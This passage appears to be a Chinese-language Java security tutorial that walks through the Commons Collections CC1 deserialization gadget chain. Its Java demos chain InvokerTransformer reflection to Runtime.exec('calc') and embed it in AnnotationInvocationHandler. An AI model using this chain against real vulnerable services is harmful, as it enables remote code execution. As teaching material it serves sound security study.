<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">public</span>/<span class="keyword">private</span>/<span class="keyword">protected</span>/<span class="keyword">default</span>) <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> serialVersionUID=<span class="number">42L</span>；</span><br></pre></td></tr></table></figure>

<p>如果可序列化类没有显式声明serialVersionUID，则序列化运行时将根据类的各个方面为该类计算默认值，如Java对象序列化规范中所述。但是，强烈建议所有可序列化类显式声明serialVersionUID值，因为它的计算对类细节高度敏感，这些细节可能因编译器实现而异，因此类中的任何更改或使用不同的id都可能影响序列化的数据。</p>
<p>还建议对UID使用private修饰符，因为它作为继承成员没有用处。</p>
<p>IDEA设置自动生成UID的方式请参考<a href="https://blog.csdn.net/gnail_oug/article/details/80263383">https://blog.csdn.net/gnail_oug/article/details/80263383</a></p>
<h1 id="java安全入门-二"><a href="#java安全入门-二" class="headerlink" title="java安全入门(二)"></a>java安全入门(二)</h1><h2 id="CC链1"><a href="#CC链1" class="headerlink" title="CC链1"></a>CC链1</h2><p>我们已经知道了序列化和反序列化漏洞的基本原理，那么怎么通过构造恶意数据，让反序列化产⽣⾮ 预期对象呢？</p>
<p>我们以CC链进行举例</p>
<h3 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h3><p>Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合⼯ 具类。</p>
<blockquote>
<p>collection是set，list，queue的抽象。</p>
</blockquote>
<p>作为Apache开源项⽬的重要组件，Commons Collections被⼴泛应⽤于各种Java应⽤的开发，⽽正 是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。</p>
<p><strong>Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer。</strong></p>
<h3 id="前置疑问"><a href="#前置疑问" class="headerlink" title="前置疑问"></a>前置疑问</h3><h4 id="使用反射获取的Runtime类，为什么可以放到readObject方法中"><a href="#使用反射获取的Runtime类，为什么可以放到readObject方法中" class="headerlink" title="使用反射获取的Runtime类，为什么可以放到readObject方法中"></a>使用反射获取的Runtime类，为什么可以放到<code>readObject</code>方法中</h4><p>实际上，我们简短的描述进行命令执行的化，就是这样，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="string">&quot;null&quot;</span>).exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>而我们使用反射的原因是因为，我们通过反射获取<code>Runtime</code>类以后，他就实现了Class本身所继承的<code>Serializable</code></p>
<p>我么现在写一个最基本的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当我们使用 <code>ctrl alt v</code>补全类型以后，会发现他是Class &lt;&gt;的泛型，当我们长按<code>ctrl</code>，左键点进去之后，就很明显的发现，它实现了<code>Serializable</code>接口，那么，他就满足了序列化的条件</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118183922.png"></p>
<h4 id="Runtime-用的时候不用-new吗？"><a href="#Runtime-用的时候不用-new吗？" class="headerlink" title="Runtime 用的时候不用 new吗？"></a>Runtime 用的时候不用 new吗？</h4><p>如果你有这样的疑惑，你不妨这样试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Runtime runtime;</span><br><span class="line">        runtime = <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>它肯定是会报错的，因为他是一个单例类，，具体什么叫单例类，，自己可以看一下java的基础知识去，</p>
<blockquote>
<p>参考java设计模式中单例模式就可</p>
</blockquote>
<p>这里放一张图</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118185236.png"></p>
<p>所以我们需要用<code>getRuntime</code>方法去获取实例</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li><p>CommonsCollections &lt;&#x3D; 3.2.1</p>
</li>
<li><p>java &lt; 8u71（我是用的是8u66）</p>
</li>
<li><p>导入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然也可以 用传统的 <code>lib</code>包下导入<code>add as a library</code></p>
</li>
</ul>
<h3 id="在CC链中使用的类"><a href="#在CC链中使用的类" class="headerlink" title="在CC链中使用的类"></a>在CC链中使用的类</h3><p>理解完上面的知识以后，你应该对反射和序列化有了初步的印象，接下来我们需要结合两者看几个demo</p>
<h4 id="Map类-TransformedMap"><a href="#Map类-TransformedMap" class="headerlink" title="Map类-&gt;TransformedMap"></a>Map类-&gt;TransformedMap</h4><blockquote>
<p>Map类是存储键值对的数据结构。 Apache Commons Collections中实现了TransformedMap ， 具体的变换逻辑由Transformer类定义。</p>
<p><strong>也就是说，TransformedMap类中的数据发⽣改变时， 可以⾃动对进⾏⼀些特殊的变换，⽐如在数据被修改时，把它改回来; 或者在数据改变时，进⾏⼀ 些我们提前设定好的操作。</strong></p>
<p>而实现怎么样的操作或者便换，都是我们提前设定好的，这叫做<code>transform</code></p>
</blockquote>
<p>我们可以使用<code>TransformedMap.decorate()</code>方法获取一个<code>TransformedMap</code>的实例 (同单例类)</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118190615.png"></p>
<blockquote>
<p>TransformedMap.decorate⽅法,预期是对Map类的数据结构进⾏转化，该⽅法有三个参数</p>
<p>第⼀个参数为待转化的Map对象 </p>
<p>第⼆个参数为Map对象内的key要经过的转化⽅法（可为单个⽅法，也可为链，也可为空）</p>
<p>第三个参数为Map对象内的value要经过的转化⽅法</p>
</blockquote>
<h5 id="Map的其他知识"><a href="#Map的其他知识" class="headerlink" title="Map的其他知识"></a>Map的其他知识</h5><ul>
<li>Map是java中的接⼝，Map.Entry是Map的⼀个内部接⼝。</li>
<li>Map提供了⼀些常⽤⽅法，如keySet()、entrySet()等⽅法。</li>
<li>keySet()⽅法返回值是Map中key值的集合；</li>
<li>entrySet()的返回值也是返回⼀个Set集合，此集合的类型为Map.Entry。</li>
<li>Map.Entry是Map声明的⼀个内部接⼝，此接⼝为泛型，定义为Entry。它表⽰Map中的⼀ 个实体（⼀个key-value对）。接⼝中有getKey(),getValue⽅法，可以⽤来对集合中的元素进⾏ 修改</li>
</ul>
<h4 id="Transform接口"><a href="#Transform接口" class="headerlink" title="Transform接口"></a>Transform接口</h4><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>作用：得到 class 对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118192316.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transform</span> <span class="operator">=</span> constantTransformer.transform(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        System.out.println(transform);</span><br><span class="line">        System.out.println(transform.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119135014.png"></p>
<h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>作用：接⼝于Transformer的类都具备把⼀个对象转化为另⼀个对象的功能</p>
<p>先看一下它最常用的构造方法，可以看到需要传递三个参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119135519.png"></p>
<p>再看一下它的<code>transform</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118191555.png"></p>
<p>我们可以看到该类接收⼀个对象，获取该对象的名称，然后调⽤了⼀个invoke⽅法传递参数。另外，多 个Transformer还能串起来，形成ChainedTransformer。当触发时，ChainedTransformer可以按顺 序调⽤⼀系列的变换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义需要执⾏的本地系统命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="comment">// 构建transformer对象</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 传⼊Runtime实例，执⾏对象转换操作</span></span><br><span class="line">        transformer.transform(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ChainedTransforme"><a href="#ChainedTransforme" class="headerlink" title="ChainedTransforme"></a>ChainedTransforme</h5><p>当传⼊的参数是⼀个数组的时候，就开始循环读取，对每个参数调⽤ transform ⽅法,从⽽构造出 ⼀条链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调⽤链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 执⾏对象转换操作</span></span><br><span class="line">        transformedChain.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>于是，我们的思路环境就出来了</p>
<ol>
<li>ConstantTransformer –&gt; 把⼀个对象转换为常量，并返回  -&gt;获取到了Runtime.class</li>
<li>InvokerTransformer –&gt; 通过反射，返回⼀个对象 -&gt; 反射获取执行方法加入参数</li>
<li>ChainedTransforme –&gt;执⾏链式的Transformer⽅法 -&gt;将反射包含的数组进行链式调用，从而连贯起来</li>
</ol>
<p>当然，这里所调用的每个类自然也是继承了<code>Serializable</code>接口，例如，</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119140006.png"></p>
<p>整体思路还是和上节课反射一样，仔细捋一下。上节课我们也提到过最后用数组包含起来传值的思路，这样是不是就理清了很多。</p>
<h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>通过上面的几个例子，我们应该可以明白，最终是需要调用<code>transform</code>方法，才能完成我们最后一步。</p>
<p>但是，问题就来了：</p>
<ol>
<li>如何传入恶意的<code>ChainedTransformer</code>；</li>
<li>如何调用<code>transform</code>方法执行本地命令；</li>
</ol>
<p>但是我们看一下由工具<code>ysoserial </code>构造的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119175804.png"></p>
<p><code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了java.util.Map接口，同时支持对Map的key或者value进行Transformer转换，调用decorate和decorateTransform方法就可以创建一个TransformedMap:</p>
<p>关键代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Transformer实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法。</p>
<p><strong>我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时（调用<code>TransformedMap</code>的<code>setValue/put/putAll</code>中的任意方法），就会自动触发<code>chainedtransformer</code>。</strong></p>
<p>所以，我们的demo’可以如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调⽤链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//创建Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// 使⽤TransformedMap创建⼀个含有恶意调⽤链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>,</span><br><span class="line">                transformedChain);</span><br><span class="line">    <span class="comment">// transformedMap.put(&quot;v1&quot;, &quot;v2&quot;);// 执⾏put也会触发transform</span></span><br><span class="line">    <span class="comment">// 遍历Map元素，并调⽤setValue⽅法</span></span><br><span class="line">        <span class="keyword">for</span> (Object obj : transformedMap.entrySet()) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">    <span class="comment">// setValue最终调⽤到InvokerTransformer的transform⽅法,从⽽触发Runtime命令执⾏调⽤链</span></span><br><span class="line">            entry.setValue(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            System.out.println(transformedMap);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们就来总结一下使用<code>TransformedMap</code>的条件</p>
<ol>
<li>实现了<code>java.io.Serializable</code>接口；</li>
<li>并且可以传入我们构建的<code>TransformedMap</code>对象；</li>
<li>调用了<code>TransformedMap</code>中的<code>setValue/put/putAll</code>中的任意方法一个方法的类；</li>
</ol>
<h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>在<code>AnnotationInvocationHandler</code>中 &#x3D;&#x3D;invoke&#x3D;&#x3D;方法都调用了get方法参数可控，&#x3D;&#x3D;readObject&#x3D;&#x3D;方法中满足<code>setValue()</code>进行<code>transform</code>执行</p>
<p>这里以<code>readObject</code>做例子</p>
<blockquote>
<p>这里的<code>readObject</code>是AnnotationInvocationHandler中的——&gt;具体参考java的多态性质</p>
</blockquote>
<blockquote>
<p>sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，是用来处理注解的一个类。它还重写了readObject方法，在readObject方法中间接的调用了TransformedMap中MapEntry的setValue方法，从而也就触发了transform方法，完成了整个攻击链的调用。</p>
</blockquote>
<p>我调了一下，调用堆栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readObject:<span class="number">428</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">82</span>, Demo05 (com.CC1)</span><br></pre></td></tr></table></figure>

<p>可以看到,调用了<code>setValue()</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119194427.png"></p>
<blockquote>
<p>上图中的第352行中的memberValues是AnnotationInvocationHandler的成员变量，memberValues的值是在var1.defaultReadObject();时反序列化生成的，它也就是我们在创建AnnotationInvocationHandler时传入的带有恶意攻击链的TransformedMap。需要注意的是如果我们想要进入到var5.setValue这个逻辑那么我们的序列化的map中的key必须包含创建AnnotationInvocationHandler时传入的注解的方法名。</p>
</blockquote>
<p>于是，我们修改后完整的过程如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置构造方法的访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：</span></span><br><span class="line">            <span class="comment">// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建用于存储payload的二进制输出流对象</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span 